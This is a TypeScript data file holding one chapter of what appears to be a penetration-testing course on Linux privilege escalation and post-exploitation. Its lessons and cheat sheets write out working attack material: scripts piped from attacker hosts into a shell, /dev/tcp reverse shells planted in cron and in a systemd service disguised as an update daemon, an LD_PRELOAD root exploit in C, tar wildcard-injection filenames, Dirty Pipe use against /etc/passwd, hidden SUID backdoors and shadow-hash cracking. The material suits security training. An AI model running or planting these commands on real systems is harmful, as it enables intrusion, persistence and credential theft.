import { RoadmapChapter } from "./types";

export const chapter8: RoadmapChapter = {
  id: "ch-8-linux-privesc",
  chapterNumber: 8,
  title: "Linux Privilege Escalation & Post-Exploitation",
  subtitle: "Kernel Exploits, SUID Hijacking, Linux Capabilities, Sudo LD_PRELOAD & Automated LinPEAS Triage",
  badge: "Chapter 8 • Privilege Escalation",
  duration: "18 Hours • 6 In-Depth Lessons",
  difficulty: "Advanced",
  description:
    "Catching a low-privilege reverse shell as `www-data` is only the beginning. Master internal Linux enumeration, weaponize misconfigured SUID binaries and POSIX Capabilities, exploit Sudo `LD_PRELOAD` rules, abuse wildcard expansion in automated cronjobs, compile kernel exploits (Dirty Pipe CVE-2022-0847), and establish stealth post-exploitation persistence.",
  iconName: "Terminal",
  lessons: [
    {
      id: "l-8-1",
      lessonNumber: "8.1",
      title: "Linux Enumeration Scripts: LinPEAS, LinEnum & LinPEAS",
      duration: "2.5 Hours",
      badge: "Local Enumeration",
      summary:
        "Executing stealth in-memory host enumeration using LinPEAS, parsing color-coded findings, and manually inspecting network sockets, mounted drives, and process trees.",
      studyNotes: [
        {
          heading: "The LinPEAS In-Memory Enumeration Methodology",
          subheading: "Running automated post-compromise reconnaissance without writing to disk",
          points: [
            "Why In-Memory Execution Matters: Dropping scripts onto disk in `/home` or `/var/www` triggers endpoint detection agents (EDR) and leaves permanent forensic footprints. Instead, pipe the script directly into memory from your attack machine (`curl http://attacker.com/linpeas.sh | sh`).",
            "Color Code Hierarchy in LinPEAS: RED/YELLOW (99% probability of a direct root privilege escalation vector; investigate immediately!), RED (Highly interesting configuration or potential vector), YELLOW (Special privileges, SUID, or passwords).",
            "Key Information Gathered: Kernel version architecture (`uname -a`), active network sockets listening only on localhost (`ss -tulpn`), mounted drives and NFS shares with `no_root_squash` (`cat /etc/fstab`), writable system folders, and cached credentials in history files (`~/.bash_history`).",
            "Manual Enumeration Discipline: Never rely 100% on automated scripts. If an antivirus kills LinPEAS, you must know how to manually query `sudo -l`, inspect `/etc/crontab`, search for SUID binaries with `find`, and check process trees with `ps aux`.",
          ],
          callout: "When LinPEAS highlights a line in RED on a YELLOW background, drop everything and read that line. It indicates a verified 1-click privilege escalation path, such as an unshadowed password file, active CVE, or SUID binary with known GTFOBins escape.",
          diagramOrCode: `+-------------------------------------------------------------+
|               IN-MEMORY LINPEAS HOST ENUMERATION            |
+-------------------------------------------------------------+
 Attacker Machine (Hosts LinPEAS on port 80):
   python3 -m http.server 80
        |
        v (Piped across reverse shell directly into memory)
 Compromised Linux Target:
   curl -s http://10.10.14.5/linpeas.sh | sh
        |
        v
 [ In-Memory Execution in /bin/sh ]
   - Kernel Version Check: Linux 5.10.0-8-amd64 (Vulnerable to Dirty Pipe!)
   - Sudo Privileges: (root) NOPASSWD: /usr/bin/vim
   - Listening Local Ports: 127.0.0.1:3306 (MySQL Database)
   - SUID Binaries: /usr/bin/find (SUID bit set!)`
        },
        {
          heading: "Manual Host Enumeration Essentials",
          subheading: "Core Linux commands when script execution is blocked by security controls",
          points: [
            "System Architecture & OS Version: `uname -a; cat /etc/os-release`. Pinpoints the exact Linux distribution (Debian, Ubuntu, Alpine, RHEL) and kernel release.",
            "Local Network Sockets (`ss -tulpn` or `netstat -antup`): Reveals internal services listening exclusively on `127.0.0.1`. A local Redis, Tomcat, or MySQL server that was unreachable externally can now be attacked directly from your local shell.",
            "Process Monitoring (`ps aux` or `ps -ef`): Look for root processes running from non-standard directories (`/opt/custom_daemon.sh` or `/tmp`).",
            "User & Group Enumeration: `id; groups; cat /etc/passwd`. Look for membership in sensitive groups like `docker`, `lxd`, `disk`, `adm`, or `sudo`.",
          ],
          callout: "Group Membership Privilege Escalation: If your user belongs to the `docker` group (`id` shows `groups=...docker`), you are already root! Simply run `docker run -v /:/mnt --rm -it alpine chroot /mnt` to mount the entire host filesystem with unrestricted root access.",
          diagramOrCode: `MANUAL ENUMERATION CHEATSHEET:
  id                                -> Current UID, GID, and group memberships
  uname -a                          -> OS kernel version and hardware architecture
  sudo -l                           -> Check commands executable as root
  ss -tulpn                         -> List open local listening ports
  find / -perm -4000 2>/dev/null    -> Find all SUID binaries on disk
  cat /etc/crontab                  -> Inspect scheduled system tasks`
        }
      ],
      keyTopics: [
        "In-memory script execution via cURL pipes to avoid disk artifacts",
        "Interpreting LinPEAS color coding: RED/YELLOW privilege escalation indicators",
        "Manual enumeration of listening local ports, mounted filesystems, and cronjobs",
        "Privilege escalation via sensitive group memberships (docker, lxd, disk)",
      ],
      terminalCommands: [
        "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
        "ss -tulpn",
        "cat /etc/issue && uname -r",
      ],
      proTips: [
        "Always check `history` or `cat ~/.bash_history`; system administrators frequently type passwords directly into commands like `mysql -u root -pPassword123`.",
        "Check `/etc/fstab` for NFS shares mounted with `no_root_squash`; if present, an attacker can create an SUID binary on their local machine and execute it as root on the target.",
      ],
    },
    {
      id: "l-8-2",
      lessonNumber: "8.2",
      title: "Exploiting SUID, SGID & Linux Capabilities (cap_setuid)",
      duration: "3.5 Hours",
      badge: "SUID & Capabilities",
      summary:
        "Auditing and weaponizing misconfigured SUID/SGID binaries, custom administrative wrappers, and fine-grained Linux Capabilities (cap_setuid, cap_dac_read_search) to spawn root shells.",
      studyNotes: [
        {
          heading: "SUID & SGID Deep Dive Mechanics",
          subheading: "How file permission bits grant temporary root execution privileges",
          points: [
            "What is SUID (Set User ID)? When a binary with SUID (octal `4000`, displayed as `s` in `-rwsr-xr-x`) is executed, its Effective UID (`euid`) is set to the owner of the file (usually root `0`), regardless of who ran it.",
            "Hunting for SUID Binaries: `find / -perm -4000 -type f 2>/dev/null`. Compare the output against standard default OS binaries to isolate custom administrator scripts or out-of-date utilities.",
            "GTFOBins Exploitation: If standard binaries like `find`, `vim`, `bash`, `python`, `cp`, or `pkexec` have the SUID bit set, you can execute immediate root escapes (`find . -exec /bin/sh -p \\; -quit`).",
            "Shared Object (SO) Injection in SUID Binaries: If a custom SUID binary attempts to load a shared library (`.so`) from a writable directory or relative path (checked via `strace` or `ldd`), an attacker can compile a malicious `.so` file that executes `/bin/bash` in its `init` constructor.",
          ],
          callout: "The `-p` flag is critical! Modern `/bin/bash` drops SUID privileges upon launch unless the `-p` (privileged) flag is explicitly passed. If `bash` has the SUID bit, running `bash` yields a normal user shell, but running `bash -p` yields a ROOT shell.",
          diagramOrCode: `+-------------------------------------------------------------+
|               SUID PRIVILEGE ELEVATION LIFECYCLE            |
+-------------------------------------------------------------+
 User "john" (UID: 1000) executes SUID binary:
   /usr/local/bin/backup_tool (Owned by root, Perms: -rwsr-xr-x)
        |
        v
 Linux Kernel sets:
   Real UID (ruid) = 1000 (john)
   Effective UID (euid) = 0 (root)  <-- Operating under root privileges!
        |
        v
 If backup_tool invokes system("sh"), shell inherits euid=0!
 Run: sh -p ===> Instant Root Shell!`
        },
        {
          heading: "Linux Capabilities (cap_setuid & cap_net_raw)",
          subheading: "Fine-grained kernel privilege delegation without full SUID root access",
          points: [
            "Why Capabilities Exist: To avoid granting full SUID root access to binaries that only need a single specific privileged operation (e.g. `ping` only needs `cap_net_raw` to create raw ICMP sockets).",
            "Hunting for Capabilities: Run `getcap -r / 2>/dev/null` to search the entire filesystem for binaries with assigned capabilities.",
            "The Fatal `cap_setuid` Capability: If a binary (like Python, Perl, or Node.js) is granted `cap_setuid+ep`, it has the kernel authority to set its own UID to 0 (root)!",
            "Exploiting `cap_setuid` in Python: Running `python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'` immediately grants an unrestricted root shell.",
          ],
          callout: "System administrators frequently assign `cap_setuid` to Python or Node.js so developers can bind to port 80 without typing `sudo`. In doing so, they have unintentionally given every user on the system a 1-second pathway to full root compromise.",
          diagramOrCode: `LINUX CAPABILITIES PRIVILEGE ESCALATION CHEATSHEET:
  1. Enumerate capabilities:
     getcap -r / 2>/dev/null
  
  2. If /usr/bin/python3 has cap_setuid+ep:
     python3 -c 'import os; os.setuid(0); os.system("/bin/bash")'
  
  3. If /usr/bin/tar has cap_dac_read_search+ep (Read any file):
     tar -cf shadow.tar /etc/shadow && tar -xf shadow.tar`
        }
      ],
      keyTopics: [
        "SUID and SGID permission bit mechanics and hunting techniques",
        "Escaping restricted shells via GTFOBins curated binary techniques",
        "Shared Object (`.so`) injection in custom compiled SUID executables",
        "Linux Capabilities enumeration (`getcap`) and weaponizing `cap_setuid`",
      ],
      terminalCommands: [
        "find / -perm -4000 -type f 2>/dev/null",
        "getcap -r / 2>/dev/null",
        "python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'",
      ],
      proTips: [
        "Always pass `-p` to `/bin/bash` or `/bin/sh` when exploiting SUID binaries; modern shells drop SUID privileges by default unless `-p` is explicitly supplied.",
        "Check custom SUID binaries with `strings /path/to/binary`; if it calls a command like `cat` without an absolute path (`/bin/cat`), you can execute a PATH hijacking attack!",
      ],
    },
    {
      id: "l-8-3",
      lessonNumber: "8.3",
      title: "Sudo Rights & LD_PRELOAD Environment Exploitation",
      duration: "3 Hours",
      badge: "Sudo Exploitation",
      summary:
        "Exploiting permissive sudo configurations (`sudo -l`), wildcard path abuses, and hijacking dynamic library loading via `env_keep+=LD_PRELOAD`.",
      studyNotes: [
        {
          heading: "Auditing Sudo Permissions (`sudo -l`)",
          subheading: "Discovering misconfigured administrative execution rights",
          points: [
            "The Sudoers Specification (`/etc/sudoers`): Defines which users can execute which commands as which target accounts (e.g. `john ALL=(root) NOPASSWD: /usr/bin/find`).",
            "Zero-Password Execution (`NOPASSWD`): If a command is marked `NOPASSWD`, you can execute it as root without knowing the current user's password or root's password.",
            "GTFOBins via Sudo: If standard utilities are listed in `sudo -l`, root is trivial: `sudo vim -c ':!/bin/sh'`, `sudo find . -exec /bin/sh \\;`, or `sudo less /etc/shadow` (type `!/bin/sh` inside less).",
            "Wildcard Abuses in Sudo: If sudoers specifies `sudo /usr/bin/cat /var/log/*`, you can traverse directories: `sudo /usr/bin/cat /var/log/../../etc/shadow` to read the root password hash file!",
          ],
          callout: "The very first command you should execute upon catching any reverse shell is `sudo -l`. In Capture The Flag (CTF) challenges and enterprise pentests alike, lazy sysadmin sudoers rules are the #1 root cause of privilege escalation.",
          diagramOrCode: `+-------------------------------------------------------------+
|               SUDO PRIVILEGE ESCALATION WORKFLOW            |
+-------------------------------------------------------------+
 Step 1: Run 'sudo -l'
 Output:
   User john may run the following commands on target:
       (ALL : ALL) NOPASSWD: /usr/bin/man
 
 Step 2: Check GTFOBins for 'man':
   Running 'man' invokes a pager (less).
 
 Step 3: Execute escape:
   sudo man man
   !/bin/sh
 
 Result: Instant ROOT shell!`
        },
        {
          heading: "LD_PRELOAD & LD_LIBRARY_PATH Environment Hijacking",
          subheading: "Injecting malicious C shared objects during sudo execution",
          points: [
            "What is `LD_PRELOAD`? An environment variable that instructs the Linux dynamic linker (`ld.so`) to load a specified shared library (`.so`) BEFORE any other library, allowing an attacker to hook and override standard C functions.",
            "The `env_keep` Vulnerability: By default, modern sudo strips dangerous environment variables. However, if `/etc/sudoers` contains `Defaults env_keep += \"LD_PRELOAD\"`, any user with rights to run *any* sudo command can load a custom library as root!",
            "Compiling the Malicious Shared Object: Write a small C program with a constructor function `__attribute__((constructor)) void init()` that calls `setuid(0)` and `system(\"/bin/bash\")`. Compile as a shared library: `gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles`.",
            "Execution: Run `sudo LD_PRELOAD=/tmp/pe.so <any_allowed_command>`. The linker executes your malicious constructor as root before the allowed command even starts!",
          ],
          callout: "If `sudo -l` shows `env_keep += LD_PRELOAD`, it does not matter what command you are allowed to run (even a harmless tool like `/usr/bin/uptime`). You have guaranteed root access in under 10 seconds.",
          diagramOrCode: `LD_PRELOAD ROOT EXPLOIT CODE (pe.c):
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>
#include <unistd.h>

void _init() {
    unsetenv("LD_PRELOAD");
    setgid(0);
    setuid(0);
    system("/bin/bash -p");
}

COMPILE & EXECUTE:
  gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles
  sudo LD_PRELOAD=/tmp/pe.so find`
        }
      ],
      keyTopics: [
        "Parsing `sudo -l` outputs and identifying `NOPASSWD` entries",
        "GTFOBins weaponization of sudo-permitted system binaries",
        "Directory traversal and parameter injection in sudo wildcard paths",
        "Weaponizing `env_keep += LD_PRELOAD` using malicious C shared libraries",
      ],
      terminalCommands: [
        "sudo -l",
        "gcc -fPIC -shared -o /tmp/pe.so pe.c -nostartfiles",
        "sudo LD_PRELOAD=/tmp/pe.so /usr/bin/find",
      ],
      proTips: [
        "If you can run `sudo vi` or `sudo vim`, type `:set shell=/bin/bash` followed by `:shell` to drop straight into a root prompt.",
        "Check for `sudo` version vulnerabilities: versions prior to 1.8.28 are vulnerable to the Baron Samedit heap overflow (CVE-2021-3156).",
      ],
    },
    {
      id: "l-8-4",
      lessonNumber: "8.4",
      title: "Vulnerable Cron Jobs, Wildcard Injections & PATH Hijacking",
      duration: "3 Hours",
      badge: "Cron & PATH",
      summary:
        "Exploiting scheduled cron tasks running as root: hijacking writable script files, abusing tar/rsync wildcard injection (`*`), and overriding relative PATH executables.",
      studyNotes: [
        {
          heading: "Linux Cron Architecture & File Permission Flaws",
          subheading: "How automated background maintenance tasks become privilege escalation vectors",
          points: [
            "What are Cron Jobs? The Linux time-based job scheduler. Scheduled tasks are stored in `/etc/crontab`, `/etc/cron.d/`, and user spools `/var/spool/cron/crontabs/`.",
            "Hunting for Root Cron Jobs: Inspect `/etc/crontab`. Look for scripts executing under the `root` user account every minute (`* * * * * root /opt/backup.sh`).",
            "Writable Script Hijacking: If the script being executed by root is world-writable (check via `ls -la /opt/backup.sh`), any low-privilege user can append a reverse shell payload: `echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' >> /opt/backup.sh`. Within 60 seconds, root executes the script, granting an instant root reverse shell!",
            "Writable Directory / Overwrite: If the script itself is not writable, but the parent directory (`/opt/`) is writable, an attacker can delete `backup.sh` and create a new malicious replacement.",
          ],
          callout: "Process Monitoring with PSPY: Many root cron jobs are not listed in `/etc/crontab` (they run from user crontabs or systemd timers). Use `pspy` to monitor Linux system calls (`execve`) in real time without root privileges, catching hidden recurring root tasks.",
          diagramOrCode: `+-------------------------------------------------------------+
|               CRON JOB PRIVILEGE ESCALATION FLOW            |
+-------------------------------------------------------------+
 /etc/crontab contains:
   * * * * * root /backup/cleanup.sh (Runs every 60 seconds)
        |
        v Check permissions:
   ls -la /backup/cleanup.sh
   -rwxrwxrwx 1 root root 120 Jan 10 10:00 /backup/cleanup.sh  <-- Writable!
        |
        v Attacker appends payload:
   echo "cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash" >> /backup/cleanup.sh
        |
        v 60 seconds later...
 Cron executes as root!
 Run: /tmp/rootbash -p ===> Instant Root Shell!`
        },
        {
          heading: "Wildcard Injection (`*`) in Tar and Rsync",
          subheading: "Weaponizing command-line argument expansion against administrative scripts",
          points: [
            "How Shell Wildcards Work: When a script executes `tar -czf backup.tar.gz *`, the shell expands the asterisk `*` into a list of every file in the directory before passing it to `tar`.",
            "The Exploit: If an attacker creates files named `--checkpoint=1` and `--checkpoint-action=exec=sh shell.sh` in that directory, `tar` parses those filenames as COMMAND-LINE FLAGS rather than file names!",
            "Result: Tar reaches checkpoint 1 and executes `sh shell.sh` under root privileges.",
            "PATH Hijacking in Cron: If a cron job executes `cleanup` instead of the absolute path `/usr/local/bin/cleanup`, and `/etc/crontab` defines `PATH=/home/user/bin:/usr/bin:...`, creating a fake `cleanup` binary in `/home/user/bin` hijacks execution.",
          ],
          callout: "Never use wildcards `*` in scripts that run as root! A script like `cd /tmp && rm -rf *` or `tar -cf backup.tar *` can be weaponized in seconds via argument injection.",
          diagramOrCode: `TAR WILDCARD INJECTION EXPLOIT STEPS:
1. Navigate to target folder processed by root cron:
   cd /var/www/html/backups
   
2. Create malicious payload script:
   echo "chmod +s /bin/bash" > shell.sh
   chmod +x shell.sh
   
3. Create flag decoy files:
   touch "/var/www/html/backups/--checkpoint=1"
   touch "/var/www/html/backups/--checkpoint-action=exec=sh shell.sh"
   
4. Wait for root cron 'tar -cf backup.tar *' to execute:
   Result: /bin/bash becomes SUID! Run: bash -p`
        }
      ],
      keyTopics: [
        "Analyzing system and user cron tables: `/etc/crontab`, `/etc/cron.d/`",
        "Inspecting background task execution in real time with `pspy`",
        "Wildcard argument injection in `tar`, `rsync`, and `chown`",
        "PATH variable hijacking in automated administrative scripts",
      ],
      terminalCommands: [
        "cat /etc/crontab",
        "touch '/var/backup/--checkpoint=1'",
        "touch '/var/backup/--checkpoint-action=exec=sh shell.sh'",
      ],
      proTips: [
        "Download and run `pspy64` to snoop on root processes without root permissions; it detects short-lived cron tasks that execute and vanish in milliseconds.",
        "When checking cron jobs, look for custom Python scripts; if a python script imports a module like `import utils`, you can create a malicious `utils.py` in the same directory to hijack it!",
      ],
    },
    {
      id: "l-8-5",
      lessonNumber: "8.5",
      title: "Kernel Exploitation: Dirty COW & Modern Dirty Pipe (CVE-2022-0847)",
      duration: "3.5 Hours",
      badge: "Kernel Exploits",
      summary:
        "Compiling and deploying Linux kernel privilege escalation exploits: Dirty COW (CVE-2016-5195) and the modern Dirty Pipe vulnerability (CVE-2022-0847) to overwrite read-only root files.",
      studyNotes: [
        {
          heading: "Linux Kernel Vulnerability Mechanics",
          subheading: "Exploiting ring-0 memory management flaws to achieve unconditional root",
          points: [
            "The Kernel Ring-0 Boundary: The Linux kernel operates at Ring 0 (highest CPU privilege level), controlling hardware, virtual memory, and process security contexts. A kernel vulnerability bypasses all userspace permissions (UID, GID, Sudo, Capabilities) completely.",
            "Copy-On-Write (COW) Race Condition (CVE-2016-5195 / Dirty COW): Exploited a race condition in the kernel's memory management subsystem, allowing an unprivileged user to write to read-only memory mappings. Attackers used it to overwrite `/etc/passwd` to inject a root user.",
            "Dirty Pipe (CVE-2022-0847): Discovered by Max Kellermann in 2022, affecting Linux kernels 5.8 through 5.16.11. Flaw in the pipe buffer flag handling (`PIPE_BUF_FLAG_CAN_MERGE`), allowing unprivileged processes to write arbitrary data into the page cache of ANY file on disk, even if the file is read-only!",
            "Overwriting `/etc/passwd`: With Dirty Pipe, an attacker replaces root's password field `x` in `/etc/passwd` with a known password hash, then runs `su root` for instant root access.",
          ],
          callout: "KERNEL EXPLOIT RISK: Kernel exploits operate directly on kernel memory structures. If an exploit has slight memory alignment errors or race condition timing misses, it will trigger a Kernel Panic, instantly crashing the production server. In enterprise penetration tests, kernel exploits are strictly a LAST RESORT.",
          diagramOrCode: `+-------------------------------------------------------------+
|               DIRTY PIPE (CVE-2022-0847) EXPLOIT MODEL      |
+-------------------------------------------------------------+
 Unprivileged User (UID: 1000)
       |
       v Opens read-only file: /etc/passwd
 [ Kernel Page Cache ]  ===> Merges pipe buffer flags without clearing
       |
       v (Bypasses filesystem read-only checks!)
 Overwrites root entry:
   root:x:0:0:root:/root:/bin/bash
   TO:
   root:$1$xyz$abc...:0:0:root:/root:/bin/bash  <-- Password replaced!
       |
       v Run: su root (Password: "password")
 Instant Root Access achieved without modifying physical disk block!`
        },
        {
          heading: "Compiling & Deploying Kernel Exploits Safely",
          subheading: "Cross-compiling C exploits to match target GLIBC and architecture",
          points: [
            "Identifying Kernel Architecture: Run `uname -a`. Take note of the exact kernel version (e.g. `Linux 5.10.0-8-amd64`) and GLIBC version (`ldd --version`).",
            "Searching Exploit-DB: Use `searchsploit linux kernel 5.10` or the Linux-Exploit-Suggester script (`les.sh`).",
            "Cross-Compiling vs On-Target Compiling: Many hardened production servers lack `gcc` or make utilities. You must compile the C exploit on your local Kali machine using static linking (`gcc -static exploit.c -o exploit`) so it runs without external library dependencies on the target.",
            "Restoring Backups Post-Exploit: Exploits like Dirty Pipe mutate `/etc/passwd`. Always restore the original backup file immediately after spawning your root shell to prevent locking out legitimate administrators.",
          ],
          callout: "Always verify if the target is a container (Docker/LXC) or virtual machine. Running a kernel exploit inside a Docker container exploits the HOST machine's kernel, potentially escaping the container into the host operating system!",
          diagramOrCode: `COMPILING DIRTY PIPE EXPLOIT:
  # On local Kali machine:
  gcc -static dirtypipe.c -o dirtypipe
  
  # Transfer to target /dev/shm (RAM-only):
  curl http://10.10.14.5/dirtypipe -o /dev/shm/dirtypipe
  chmod +x /dev/shm/dirtypipe
  
  # Execute against /etc/passwd:
  /dev/shm/dirtypipe /etc/passwd 1 "root::0:0:root:/root:/bin/bash"
  su root (Press enter with NO password)`
        }
      ],
      keyTopics: [
        "Kernel ring-0 privilege execution vs userspace DAC security controls",
        "Dirty COW (CVE-2016-5195) and Dirty Pipe (CVE-2022-0847) mechanics",
        "Statically compiling C exploits on Kali for targets missing `gcc`",
        "Risk mitigation: preventing kernel panics and restoring system state",
      ],
      terminalCommands: [
        "uname -a",
        "searchsploit 'Linux Kernel 5.10'",
        "gcc -static exploit.c -o exploit",
      ],
      proTips: [
        "Always compile kernel exploits with `gcc -static`; targets often have older GLIBC libraries that cause dynamically linked binaries to fail with segmentation faults.",
        "Check `/proc/version` to see the exact GCC compiler version used to build the target kernel, and match it on your compilation host.",
      ],
    },
    {
      id: "l-8-6",
      lessonNumber: "8.6",
      title: "Post-Exploitation Persistence & Credential Harvesting",
      duration: "2.5 Hours",
      badge: "Persistence",
      summary:
        "Establishing persistent administrative access via SSH authorized keys, root crontabs, systemd backdoor services, and dumping plaintext credentials from memory with Mimipenguin.",
      studyNotes: [
        {
          heading: "Linux Post-Exploitation Persistence Mechanisms",
          subheading: "Ensuring persistent backdoor access across system reboots and credential rotations",
          points: [
            "SSH Authorized Keys Persistence: The most stable backdoor. Generate an SSH key on your local machine (`ssh-keygen -t ed25519`) and append your public key to `/root/.ssh/authorized_keys`. You can now SSH directly into the machine as root at any time without a password.",
            "Root Crontab Persistence: Adding a hidden reverse shell entry to `/etc/crontab` that connects back to your VPS every hour: `@reboot root /bin/bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1`.",
            "Custom Systemd Service Backdoors: Creating a custom systemd service in `/etc/systemd/system/maintenance.service` that starts automatically on boot: `ExecStart=/bin/bash -c '...'`. Enable with `systemctl enable maintenance`.",
            "SUID Bash Backdoor: Copying `/bin/bash` to a hidden directory and setting the SUID bit: `cp /bin/bash /usr/local/bin/.sys_check && chmod 4755 /usr/local/bin/.sys_check`. Any low-privilege user can now spawn root by running `.sys_check -p`.",
          ],
          callout: "In authorized corporate red team engagements, every single persistence mechanism deployed MUST be strictly logged with exact file paths and timestamps in your engagement log so they can be completely removed during client remediation.",
          diagramOrCode: `+-------------------------------------------------------------+
|               SYSTEMD SERVICE PERSISTENCE BACKDOOR          |
+-------------------------------------------------------------+
 File: /etc/systemd/system/sys-update.service
 
 [Unit]
 Description=System Update Daemon
 After=network.target
 
 [Service]
 Type=simple
 User=root
 ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1'
 Restart=always
 RestartSec=60
 
 [Install]
 WantedBy=multi-user.target
 
 Enable: systemctl enable sys-update && systemctl start sys-update`
        },
        {
          heading: "Credential Harvesting from Memory & Disk",
          subheading: "Dumping cleartext passwords and private cryptographic keys",
          points: [
            "Dumping Memory with Mimipenguin: The Linux equivalent of Windows Mimikatz. Mimipenguin extracts cleartext passwords of currently logged-in users from processes like GDM (GNOME Display Manager), vsftpd, and Apache.",
            "Harvesting SSH Private Keys: Searching the entire filesystem for unencrypted private keys: `grep -rnw '/home' -e 'BEGIN OPENSSH PRIVATE KEY' 2>/dev/null`.",
            "Extracting Web Application Passwords: Navigating to `/var/www/html/` and inspecting database configuration files (`wp-config.php`, `.env`, `settings.py`, `config.php`). System administrators frequently reuse database passwords as root system passwords!",
            "Dumping `/etc/shadow`: Once root is achieved, copy `/etc/shadow` and `/etc/passwd`. Unshadow them (`unshadow passwd shadow > unshadowed.txt`) and feed into John the Ripper or Hashcat to crack all corporate user passwords offline.",
          ],
          callout: "Password Reuse: In over 60% of enterprise environments, the database password stored in `/var/www/html/config.php` matches the root system password or the Active Directory administrator's password.",
          diagramOrCode: `CREDENTIAL HARVESTING CHEATSHEET:
  # Dump and crack password hashes:
  unshadow /etc/passwd /etc/shadow > hashes.txt
  john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
  
  # Search for private SSH keys:
  find / -name "id_rsa" -o -name "id_ed25519" 2>/dev/null
  
  # Search for database connection strings:
  grep -ri "DB_PASSWORD" /var/www/ 2>/dev/null`
        }
      ],
      keyTopics: [
        "Establishing persistent SSH backdoors via `authorized_keys`",
        "Deploying stealth systemd background services and root cron persistence",
        "Extracting cleartext passwords from memory using Mimipenguin",
        "Unshadowing and cracking `/etc/shadow` hashes with Hashcat and John the Ripper",
      ],
      terminalCommands: [
        "echo 'ssh-ed25519 AAAAC3N... attacker' >> /root/.ssh/authorized_keys",
        "unshadow /etc/passwd /etc/shadow > unshadowed.txt",
        "john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt",
      ],
      proTips: [
        "Always check `/root/.bash_history` after gaining root; it reveals recently executed maintenance scripts, hidden backup passwords, and internal servers.",
        "Check `/etc/sudoers.d/`; developers often drop custom sudoers files here rather than editing `/etc/sudoers` directly.",
      ],
    },
  ],
  handsOnLab: {
    title: "Lab 8: Privilege Escalation Gauntlet: SUID, Sudo & Dirty Pipe",
    target: "Hardened Linux Practice Machine (PrivEsc Target)",
    goal: "Start with an unprivileged www-data shell, audit the system using LinPEAS, exploit a misconfigured Sudo permission to gain a secondary user, hijack a root cronjob, and deploy Dirty Pipe to achieve full root access.",
    steps: [
      "1. Catch initial reverse shell as www-data and stabilize the TTY using Python PTY.",
      "2. Execute LinPEAS in memory via curl pipe and identify high-priority RED/YELLOW vectors.",
      "3. Exploit a sudo privilege on a custom binary using GTFOBins techniques.",
      "4. Inspect /etc/crontab and hijack a writable cleanup script running every minute.",
      "5. Compile and execute the Dirty Pipe (CVE-2022-0847) exploit to inject a root user into /etc/passwd.",
      "6. Establish SSH persistence in /root/.ssh/authorized_keys and dump the shadow hash file.",
    ],
    verification: "Submit the root flag from /root/root.txt and the cracked root password hash from /etc/shadow.",
  },
  checklist: [
    { id: "ch8-t1", label: "Executed in-memory LinPEAS enumeration and triaged RED/YELLOW escalation vectors" },
    { id: "ch8-t2", label: "Mastered SUID/SGID hunting and weaponized GTFOBins binary escapes" },
    { id: "ch8-t3", label: "Identified and exploited Linux Capabilities (cap_setuid) in scripting interpreters" },
    { id: "ch8-t4", label: "Exploited misconfigured Sudo permissions and hijacked LD_PRELOAD shared objects" },
    { id: "ch8-t5", label: "Hijacked scheduled root cron tasks using writable script abuse and tar wildcards (*)" },
    { id: "ch8-t6", label: "Monitored ephemeral root processes in real time without root privileges using pspy" },
    { id: "ch8-t7", label: "Statically compiled and deployed the Dirty Pipe kernel exploit (CVE-2022-0847)" },
    { id: "ch8-t8", label: "Established root persistence via SSH authorized_keys and harvested system password hashes" },
  ],
};
